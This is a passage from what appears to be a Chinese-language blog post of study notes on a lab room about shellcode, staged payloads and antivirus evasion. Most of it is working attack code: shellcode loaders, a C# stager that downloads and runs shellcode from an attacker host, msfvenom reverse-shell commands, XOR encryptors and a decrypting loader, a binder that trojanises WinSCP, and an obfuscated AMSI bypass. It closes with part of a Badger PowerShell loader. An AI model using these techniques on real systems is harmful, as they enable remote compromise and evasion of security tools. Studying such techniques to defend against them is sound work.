段以纯二进制格式提取出来。 12objdump -d thm objcopy -j .text -O binary thm thm.text 3. 转换为 C 语言格式：使用 xxd 命令将二进制文件 thm.text 转换成 C 语言数组的十六进制表示。 1xxd -i thm.text 现在就从汇编代码中生成了我们的 shellcode，是不是很有趣，可以测试一下 shellcode 有没有用，注入 C 程序试试。 1234567891011121314#include &lt;stdio.h&gt; int main(int argc, char **argv) { unsigned char message[] = { 0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff, 0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21, 0x0d, 0x0a }; (*(void(*)())message)(); return 0; } 最后，使用 gcc 编译并执行这个 C 程序。 1gcc -g -Wall -z execstack thm.c -o thmx &amp;&amp; ./thmx Shellcode 利用使用 Msfvenom 生成 Shellcode第一个没什么好说的，msf 指定输出格式生成 1msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c Shellcode 加载器Shellcode 本身无法独立执行，它需要一个加载器（Loader）。加载器是一个简单的程序，其唯一任务就是将 Shellcode 放入内存并执行它。 12345678910111213141516171819202122#include &lt;windows.h&gt; char stager[] = { &quot;\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30&quot; &quot;\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff&quot; &quot;\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52&quot; &quot;\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1&quot; &quot;\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b&quot; &quot;\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03&quot; &quot;\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b&quot; &quot;\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24&quot; &quot;\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb&quot; &quot;\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f&quot; &quot;\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5&quot; &quot;\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a&quot; &quot;\\x00\\x53\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot; }; int main() { DWORD oldProtect; VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &amp;oldProtect); int (*shellcode)() = (int(*)())(void*)stager; shellcode(); } 编译 1i686-w64-mingw32-gcc calc.c -o calc-MSF.exe 从可执行文件（EXE）中提取 ShellcodeShellcode 并不总是以 C 语言数组的形式存在。在更高级的场景中，它可能被存储在原始的二进制文件（.bin）中，这是许多命令与控制（C2）框架的首选格式。 123456// 生成 .bin 文件 msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw &gt; /tmp/example.bin // 查看文件类型 file /tmp/example.bin // 用 xxd 提取 16 进制 xxd -i /tmp/example.bin 可以从上面生成的 C 代码 shellcode 比对，这俩是一样的。 但是我觉得这个标题描述有问题，应该是找一个 exe 文件直接提取他的入口点，然后 dump 出来，这样才是从 exe 文件中提取。 阶段 Payload之前在玩 MSF 的时候就发现分大马和小马了，这就是房间里面说的 staged or stageless payloads。 在渗透测试和恶意软件开发中，Payload 通常分为两种类型：无阶段 (Stageless) 和 分阶段 (Staged)。它们代表了两种不同的代码投递和执行策略，各有优缺点，需要根据目标环境来选择。 无阶段 Payload无阶段 Payload 是一个单一、完整的可执行文件，包含了恶意代码所需的所有功能。它不需要从攻击者的服务器下载任何额外的组件。 优点： 独立性强：Payload 包含了所有必需的代码，无需额外的网络连接。 隐蔽性高：由于没有后续的网络下载行为，它更难被网络安全设备（如 IPS）检测到。 适用于受限环境：特别适合在无法进行出站网络连接的封闭网络或气隙网络（air-gapped networks）中使用。 分阶段 Payload分阶段 Payload 采用两步走策略。第一阶段是一个很小的 Stager（或称“小马”），它的唯一任务就是与攻击者服务器建立连接，然后下载并执行第二阶段的最终 Payload（或称“大马”）。 优点： 体积小：Stager 的体积很小，减少了初始文件的磁盘占用，更易于投递。 增强隐蔽性：最终的 Payload 不会直接存储在磁盘上，而是在内存中加载和执行，这使得它更难被传统的基于签名的杀毒软件检测到。 灵活性高：同一个 Stager 可以用于下载不同的最终 Payload，攻击者可以根据需要动态更换 Payload，而无需重新投递文件。 保护 Payload：核心的恶意代码（最终 Payload）永远不会暴露在磁盘上，从而保护了其免受蓝队分析。 选择合适的 Payload 当你的目标是网络连接受限的环境，或者你想避免网络流量被监测时，无阶段 Payload 是更好的选择。例如，进行 USB 投递攻击时，无阶段 Payload 能确保在没有网络连接的情况下也能成功执行。 当你的主要目标是最小化本地足迹，并避免被杀毒软件检测时，分阶段 Payload 是更优的方案。它利用了内存执行的优势，让分析和取证变得更加困难。 Metasploit 中的 Stager如果要生成反向 TCP shell，会发现有两种有效载荷可用于此目的，名称略有不同（注意 shell 之后的 _ 与 / ）： Payload Type windows&#x2F;x64&#x2F;shell_reverse_tcp Stageless payload windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp Staged payload 创建你自己的 Stager要创建分阶段有效载荷，我们将使用 @mvelazc0 提供的 stager 代码的略微修改版本。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950using System; using System.Net; using System.Text; using System.Configuration.Install; using System.Runtime.InteropServices; using System.Security.Cryptography.X509Certificates; public class Program { // https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc [DllImport(&quot;kernel32&quot;)] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); // https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread [DllImport(&quot;kernel32&quot;)] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); // https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject [DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; public static void Main() { string url = &quot;https://10.11.141.2/shellcode.bin&quot;; Stager(url); } public static void Stager(string url) { // 创建一个 WebClient 对象 WebClient wc = new WebClient(); // 允许自签证书 ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; // 下载 Shellcode 写入到变量中 byte[] shellcode = wc.DownloadData(url); // 分配内存 UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 写入内存 Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length); // 定义线程句柄 IntPtr threadHandle = IntPtr.Zero; UInt32 threadId = 0; IntPtr parameter = IntPtr.Zero; // 启动线程 threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId); // 等待线程执行完成 WaitForSingleObject(threadHandle, 0xFFFFFFFF); } } 使用我们的 Stager 运行反向 Shell 1234567891011// 生成一个 shellcode msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.141.2 LPORT=7474 -f raw -o shellcode.bin -b &#39;\\x00\\x0a\\x0d&#39; // 创建自签证书 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj &quot;/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname&quot; // 启动 HTTPS 服务器 python3 -c &#39;from http.server import HTTPServer, SimpleHTTPRequestHandler; import ssl; host, port = &quot;0.0.0.0&quot;, 443; httpd = HTTPServer((host, port), SimpleHTTPRequestHandler); context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); context.load_cert_chain(certfile=&quot;cert.pem&quot;, keyfile=&quot;key.pem&quot;); httpd.socket = context.wrap_socket(httpd.socket, server_side=True); print(f&quot;HTTPS server running on https://{host}:{port}/&quot;); httpd.serve_forever()&#39; // 接收反向 shell nc -lvp 7474 注意这里用的是 SimpleHTTPRequestHandler ，他支持文件共享。 1234wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe tasklist /svc | findstr Def tasklist /svc | findstr Virus 绕过杀软手段编码和加密把 shellcode 编码或者是直接用加密算法把 shellcode 加密，再在 loader 里面解密之后写入内存，这样能避免直接检查出 shellcode 的明文，绕过静态检测，不过有些杀软也有解密的功能 123456789101112# 显示可用的编码器 msfvenom --list encoders | grep excellent # -e encoder # -i 迭代次数 msfvenom -a x86 --platform Windows LHOST=10.11.141.2 LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b &#39;\\x00&#39; -i 3 -f exe -o enc_shell.exe # 显示可用的加密方式 msfvenom --list encrypt # 使用 xor 加密 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key &quot;MyZekr3tKey***&quot; -o xored-revshell.exe 创建自己的编码器因为 MSF 创建的可以被检测到，所以我们要用自己的方式去处理。 12# 创建一个 chsarp 格式的 shell 马 msfvenom LHOST=10.11.141.2 LPORT=4444 -p windows/x64/shell_reverse_tcp -f csharp 房间这里提供了一个加密器： 1234567891011121314151617181920212223242526272829303132333435using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; namespace Encrypter { internal class Program { private static byte[] xor(byte[] shell, byte[] KeyBytes) { for (int i = 0; i &lt; shell.Length; i++) { shell[i] ^= KeyBytes[i % KeyBytes.Length]; } return shell; } static void Main(string[] args) { //XOR Key - It has to be the same in the Droppr for Decrypting string key = &quot;THMK3y123!&quot;; //Convert Key into bytes byte[] keyBytes = Encoding.ASCII.GetBytes(key); //Original Shellcode here (csharp format) byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 }; //XORing byte by byte and saving into a new array of bytes byte[] encoded = xor(buf, keyBytes); Console.WriteLine(Convert.ToBase64String(encoded)); } } } 生成出来 Base64 编码好的字符 1qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSFwXOXK8MHJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A== 现在我们有了编码好的 payload，所以我们需要一个可以解码我们 payload 的加载器，这个加载器用 NET8.0 编译会报错，直接用 csc 编译就行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950using System; using System.Net; using System.Text; using System.Runtime.InteropServices; public class Program { [DllImport(&quot;kernel32&quot;)] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(&quot;kernel32&quot;)] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; private static byte[] xor(byte[] shell, byte[] KeyBytes) { for (int i = 0; i &lt; shell.Length; i++) { shell[i] ^= KeyBytes[i % KeyBytes.Length]; } return shell; } public static void Main() { string dataBS64 = &quot;qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=&quot;; byte[] data = Convert.FromBase64String(dataBS64); string key = &quot;THMK3y123!&quot;; //Convert Key into bytes byte[] keyBytes = Encoding.ASCII.GetBytes(key); byte[] encoded = xor(data, keyBytes); UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length); IntPtr threadHandle = IntPtr.Zero; UInt32 threadId = 0; IntPtr parameter = IntPtr.Zero; threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId); WaitForSingleObject(threadHandle, 0xFFFFFFFF); } } 然后正常传过去上线就行了，不过这个也同样会被检测到。 打包器这个就是传统意义上的加壳嘛，让可执行文件在不改变功能的情况下去压缩和混淆他的代码，其实和上面的编码和加密有点像，不过有 VMP 这种高级的壳，直接虚拟了一个运行环境转义来运行了，更高级了。 普通的加壳在执行之后扫内存可以解，房间里面介绍了一个 ConfuserEx 的加壳工具。 捆绑器绑定器是一种将恶意可执行文件（payload）与一个或多个合法程序合并成一个新可执行文件的工具。它的主要目的是欺骗用户，让他们以为自己正在运行一个正常程序，而实际上恶意代码也在背后静默执行，绑定器本身不具备规避杀毒软件（AV）的能力。 1msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe Obfuscation Principles 混淆原理混淆是检测规避方法和防止恶意软件分析的重要组成部分。混淆最初是为了保护软件和知识产权不被窃取或复制。虽然它仍然广泛用于其最初目的，但攻击者已将其用于恶意目的。 Origins of Obfuscation 混淆起源混淆广泛运用在软件相关领域，为了保护应用程序的知识产权和其他机密信息。 Minecraft 使用 ProGuard 混淆器去混淆他的 Java 类。同时他还发布了有限的混淆信息映射，作为旧的未混淆类和新的混淆类之间的转换器，以支持模组社区。 上述的只是混淆在公众领域运用的一个例子。为了记录和组织各种混淆方法，我们可以参考《分层混淆：一种用于分层安全的软件混淆技术分类法》这篇论文。这篇研究论文按照层级组织混淆方法，类似于 OSI 模型，但针对的是应用程序数据流。 每个子层都有具体的混淆方法，这个房间中主要关注的是 Code-Element 层的内容。 要使用这个战略，我们可以确定一个目标，然后选择一个符合我们要求的方法。例如，假设我们想混淆代码的布局但不能修改现有代码。在这种情况下，我们可以注入垃圾代码，如分类法所总结的：Code Element Layer &gt; Obfuscating Layout &gt; Junk Codes，但它如何被恶意利用呢？ Obfuscation’s Function for Static Evasion 混淆在静态规避中的作用这一节提到的是 Obfuscating Data，在恶意程序中隐藏其可识别的恶意代码，使其看起来像一个合法程序。 混淆方法 目的 数组转换 通过分割、合并、折叠和展平来转换数组 数据编码 使用数学函数或密码对数据进行编码 数据程序化 用过程调用代替静态数据 数据拆分&#x2F;合并 将一个变量的信息分散到几个新变量中 因为静态签名容易被绕过，所以接下来用数据拆分&#x2F;合并来举例。 Object Concatenation 对象拼接拼接在恶意软件中最常见的应用是破坏目标静态签名，攻击者还可以预先使用它来分解程序的所有对象，并尝试一次性删除所有签名，而无需逐个查找。 下面是一个 Yara 规则的示例，我们会用拼接去规避掉这个静态特征。 123456789rule ExampleRule { strings: $text_string = \"AmsiScanBuffer\" $hex_string = { B8 57 00 07 80 C3 } condition: $my_text_string or $my_hex_string } 当使用 Yara 扫描编译后的二进制文件时，如果存在定义的字符串，它将创建积极的警报&#x2F;检测。通过连接，字符串在功能上可以相同，但在扫描时会显示为两个独立的字符串，从而不会触发警报。 1234// 原代码 IntPtr ASBPtr = GetProcAddress(TargetDLL, &quot;AmsiScanBuffer&quot;); // 输入字符串拼接 IntPtr ASBPtr = GetProcAddress(TargetDLL, &quot;Amsi&quot; + &quot;Scan&quot; + &quot;Buffer&quot;); 从字符串拼接技术延伸，攻击者还可以使用无效字符（或填充字符）来干扰或混淆静态签名。这些字符可以单独使用，也可以与字符串拼接结合使用，具体取决于签名的强度和实现方式。下表列出了一些我们可以利用的常见无效字符。 **Character ** **Purpose ** Example 分隔 将单个字符串拆分为多个子字符串并进行组合 (&#39;co&#39;+&#39;ffe&#39;+&#39;e&#39;) 重排 重新排列字符串的组成部分 (&#39;&#123;1&#125;&#123;0&#125;&#39;-f&#39;ffee&#39;,&#39;co&#39;) 空白字符 包含未被解析的空白字符 .( &#39;Ne&#39; +&#39;w-Ob&#39; + &#39;ject&#39;) 反引号（Tick） 包含未被解析的反引号 downLoAdString 随机大小写 Tokens 通常不区分大小写，可以是任意大小写形式 dOwnLoAdsTRing 实践混淆这段代码试试，我估计就是 Amsi 这种关键字作祟。 12345678910111213141516[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) # 第一版 [Ref].Assembly.GetType(&#39;Sys&#39; + &#39;tem.Manag&#39; + &#39;ement.Au&#39; + &#39;tomation.Am&#39; + &#39;siU&#39; + &#39;tils&#39;).GetField(&#39;am&#39;+&#39;siIn&#39; + &#39;itFailed&#39;,&#39;NonP&#39; + &#39;ublic,S&#39; + &#39;tatic&#39;).SetValue($null,$true) # 失败了，拆解一下检测点看看 # 这个不能过 [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;) # 这个能过 [Ref].Assembly.GetType(&#39;Sys&#39; + &#39;tem.Manag&#39; + &#39;ement.Au&#39; + &#39;tomation.Am&#39; + &#39;siU&#39; + &#39;tils&#39;) # 这个也能过 [Ref].Assembly.GetType(&#39;Sys&#39; + &#39;tem.Manag&#39; + &#39;ement.Au&#39; + &#39;tomation.Am&#39; + &#39;siU&#39; + &#39;tils&#39;).GetField(&#39;am&#39;+&#39;siIn&#39; + &#39;itFailed&#39;,&#39;NonP&#39; + &#39;ublic,S&#39; + &#39;tatic&#39;) # 那就是最后一部分了 # 这里检测的其实是 SetValue，可以把这个抽离出来作为变量传进去 $Value=&quot;SetValue&quot; [Ref].Assembly.GetType(&#39;Sys&#39; + &#39;tem.Manag&#39; + &#39;ement.Au&#39; + &#39;tomation.Am&#39; + &#39;siU&#39; + &#39;tils&#39;).GetField(&#39;am&#39;+&#39;siIn&#39; + &#39;itFailed&#39;,&#39;NonP&#39; + &#39;ublic,S&#39; + &#39;tatic&#39;).$Value($null,$true) Obfuscation’s Function for Analysis Deception 混淆在分析欺骗中的作用虽然混淆能绕过软件检测，但是他依然会被人为检测到（毕竟人不是死的），所以可以利用一些逻辑和数学去创建一些难以理解的代码。 如果你想知道更多的逆向知识，推荐完成恶意软件分析模块。 下表列出了分类法中混淆布局和混淆控制子层所涵盖的方法。 混淆方法 目的 垃圾代码 添加没有用的垃圾指令，也叫代码存根 分离相关代码 分离相关代码或者指令，增加阅读程序的难度 剥离冗余符号 剥离符号信息，例如调试信息或其他符号表 无意义标识符 将有意义的标识符转换为无意义的标识符 隐式控制 将显式控制指令转换为隐式指令 基于调度器的控制 在运行时确定要执行的下一个块 概率控制流 引入具有相同语义但不同语法的控制流 虚假控制流 故意添加到程序中但永不执行的控制流 上面的只是给一个概念性的认知，每种技术都有挺深的运用了，就留给你们自己探索了。如果碰到不懂的概念要及时查清楚，就比如标识符和符号的区别是什么。 Code Flow and Logic 代码流和逻辑控制流是程序执行的骨架，它决定了代码的逻辑走向，比如 if/else 判断和循环。程序通常自上而下执行，直到遇到逻辑语句。**控制流图（CFG）**就是用来可视化这些逻辑路径的。 攻击者如何利用控制流？ 对攻击者来说，控制流既是一个挑战，也是一个机会。安全分析师可以通过分析程序的控制流来理解其功能，这会暴露恶意意图。 然而，攻击者可以利用这一点，通过操纵控制流来混淆代码。他们的目标是引入复杂且无意义的逻辑，使得控制流变得任意混乱。这会： 迷惑分析师：让逆向工程师很难看懂代码的真实执行路径。 规避检测：通过改变代码的结构，使其不再符合杀毒软件已知的恶意行为模式。 Arbitrary Control Flow Patterns 任意控制流模式**任意控制流（Arbitrary Control Flow）**指的是恶意软件开发者通过人为设计和混淆，使程序的执行路径变得复杂、非线性、难以预测和分析。 为了实现这种复杂的控制流，开发者会利用数学、逻辑或其他复杂算法，将不同的控制流模式注入到恶意代码中。这些算法的核心是谓词（Predicates），即那些只返回真或假值的判断式。从高层次看，我们可以将谓词理解为 if 语句中的条件，它决定了代码块是否执行。 不透明谓词 (Opaque Predicates)在混淆技术中，不透明谓词是实现任意控制流的关键。正如之前提到的那篇论文所指出的，不透明谓词是一种其值对开发者已知但难以被逆向分析者推断的谓词。 举例来说，一个不透明谓词的数学表达式可能非常复杂，但开发者知道它的结果永远为真。当分析师试图理解这段代码时，他们会认为这里存在两种执行路径，但实际上只有一条是可行的。 不透明谓词属于虚假控制流和概率控制流方法。它可以与垃圾代码等其他混淆方法无缝结合，任意地向程序中添加虚假逻辑，或重构现有函数的控制流，从而使逆向工程变得异常艰巨。 虽然深入研究不透明谓词需要扎实的数学和计算基础，但在后续的分析中，我们将观察它的一个常见应用示例。 考拉兹猜想（The Collatz Conjecture）考拉兹猜想是一个常被用作不透明谓词的数学问题。该猜想指出，如果对任意一个正整数重复应用以下两个算术运算，最终都将得到 1。 如果该数为偶数，将其除以 2。 如果该数为奇数，将其乘以 3 再加 1。 这个猜想的可用之处在于，我们已知对于任何正整数输入，其输出结果最终都将是 1。这个确定的输出使得它成为一个可靠的不透明谓词。 下面是考拉兹猜想在 Python 中的示例。 12345678x = 0 while(x &gt; 1): if(x%2==1): x=x*3+1 else: x=x/2 if(x==1): print(&quot;hello!&quot;) while (x &gt; 1) 这个条件就是我们所说的谓词。考拉兹猜想的数学特性保证了，只要 x 是一个大于 1 的正整数，这个循环最终都会结束，并且 x 的值会变为 1。也就是说，x &gt; 1 这个条件最终会变为假，但它必然会执行循环体内的代码。 对于开发者来说，他们知道这个循环最终会结束。但对于静态分析工具或逆向分析师来说，他们无法轻易地推断出这个循环何时会结束，或者 x 的最终值是什么。这段代码的逻辑看似复杂，但它的最终结果是确定且可预测的。 Protecting and Stripping Identifiable Information 保护和剥离可识别信息可识别信息是逆向分析恶意软件的关键线索。通过隐藏或剥离这些信息，攻击者可以极大地增加分析师理解程序功能的难度。这些可识别信息主要分为三类：代码结构、对象名称（Object Names）和文件&#x2F;编译属性。 对象名称混淆对象名称，如变量名和函数名，能直接揭示代码的用途。尽管分析师可以通过行为分析来推断其功能，但如果没有这些上下文，难度会呈指数级上升。这种混淆方法也被称为词法混淆（Lexical Obfuscation），它将有意义的标识符（例如，checkPassword）转换为无意义的名称（例如，a 或 _123）。 编译型语言 vs. 解释型语言： 在 Python 或 PowerShell 等解释型语言中，所有对象名称在运行时都可见，因此所有名称都必须被混淆。 在 C 或 C++ 等编译型语言中，大多数本地变量名会在编译时被丢弃，但全局变量和函数名通常会保留在二进制文件中。此外，出现在字符串中的对象名称也需要特别处理，因为它们在运行时会被保留。 混淆技术：为了使混淆后的标识符更具迷惑性，攻击者会故意使用相同的名称来命名不同类型或不同作用域的对象。这种方法已被像 ProGuard 这样的 Java 混淆工具所采用。 剥离符号信息优秀的编程实践通常会采用有意义的命名规则，并且在编译后的软件中默认保留一些名称（如 C&#x2F;C++ 的全局变量名、Java 的所有名称）。这些有意义的名称会为逆向分析提供便利。因此，为了对抗分析，开发者会**混淆或剥离（Strip）**这些可识别信息，以防止它们暴露程序的原始功能。 作为解释型语言的一个例子，我们可以观察 BRC4 社区套件中已弃用的 Badger PowerShell 加载器。 123456789101112131415161718192021222324252627282930313233343536373839404142434445Set-StrictMode -Version 2 [Byte[]] $Ait1m = @(0x3d, 0x50, 0x51, 0x57, 0x50, 0x4e, 0x5f, 0x50, 0x4f, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50) [Byte[]] $ahv3I = @(0x34, 0x59, 0x38, 0x50, 0x58, 0x5a, 0x5d, 0x64, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50) [Byte[]] $Moo5y = @(0x38, 0x64, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50, 0x3f, 0x64, 0x5b, 0x50) [Byte[]] $ooR5o = @(0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x3e, 0x50, 0x4c, 0x57, 0x50, 0x4f, 0x17, 0x0b, 0x2c, 0x59, 0x5e, 0x54, 0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x2c, 0x60, 0x5f, 0x5a, 0x2e, 0x57, 0x4c, 0x5e, 0x5e) [Byte[]] $Reo5o = @(0x3d, 0x60, 0x59, 0x5f, 0x54, 0x58, 0x50, 0x17, 0x0b, 0x38, 0x4c, 0x59, 0x4c, 0x52, 0x50, 0x4f) [Byte[]] $Reib3 = @(0x3d, 0x3f, 0x3e, 0x5b, 0x50, 0x4e, 0x54, 0x4c, 0x57, 0x39, 0x4c, 0x58, 0x50, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e) [Byte[]] $Thah8 = @(0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x39, 0x50, 0x62, 0x3e, 0x57, 0x5a, 0x5f, 0x17, 0x0b, 0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57) [Byte[]] $ii5Ie = @(0x34, 0x59, 0x61, 0x5a, 0x56, 0x50) [Byte[]] $KooG5 = @(0x38, 0x54, 0x4e, 0x5d, 0x5a, 0x5e, 0x5a, 0x51, 0x5f, 0x19, 0x42, 0x54, 0x59, 0x1e, 0x1d, 0x19, 0x40, 0x59, 0x5e, 0x4c, 0x51, 0x50, 0x39, 0x4c, 0x5f, 0x54, 0x61, 0x50, 0x38, 0x50, 0x5f, 0x53, 0x5a, 0x4f, 0x5e) [Byte[]] $io9iH = @(0x32, 0x50, 0x5f, 0x3b, 0x5d, 0x5a, 0x4e, 0x2c, 0x4f, 0x4f, 0x5d, 0x50, 0x5e, 0x5e) [Byte[]] $Qui5i = @(0x32, 0x50, 0x5f, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50, 0x33, 0x4c, 0x59, 0x4f, 0x57, 0x50) [Byte[]] $xee2N = @(0x56, 0x50, 0x5d, 0x59, 0x50, 0x57, 0x1e, 0x1d) [Byte[]] $AD0Pi = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x2c, 0x57, 0x57, 0x5a, 0x4e) [Byte[]] $ahb3O = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x3b, 0x5d, 0x5a, 0x5f, 0x50, 0x4e, 0x5f) [Byte[]] $yhe4c = @(0x2E, 0x5D, 0x50, 0x4C, 0x5F, 0x50, 0x3F, 0x53, 0x5D, 0x50, 0x4C, 0x4F) function Get-Robf ($b3tz) { $aisN = [System.Byte[]]::new($b3tz.Count) for ($x = 0; $x -lt $aisN.Count; $x++) { $aisN[$x] = ($b3tz[$x] + 21) } return [System.Text.Encoding]::ASCII.GetString($aisN) } function Get-PA ($vmod, $vproc) { $a = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\\\\\\\&#39;)[-1].Equals(&#39;System.dll&#39;) }).GetType((Get-Robf $KooG5)) return ($a.GetMethod((Get-Robf $io9iH), [reflection.bindingflags] &quot;Public,Static&quot;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($a.GetMethod((Get-Robf $Qui5i))).Invoke($null, @($vmod)))), $vproc)) } function Get-TDef { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters, [Parameter(Position = 1)] [Type] 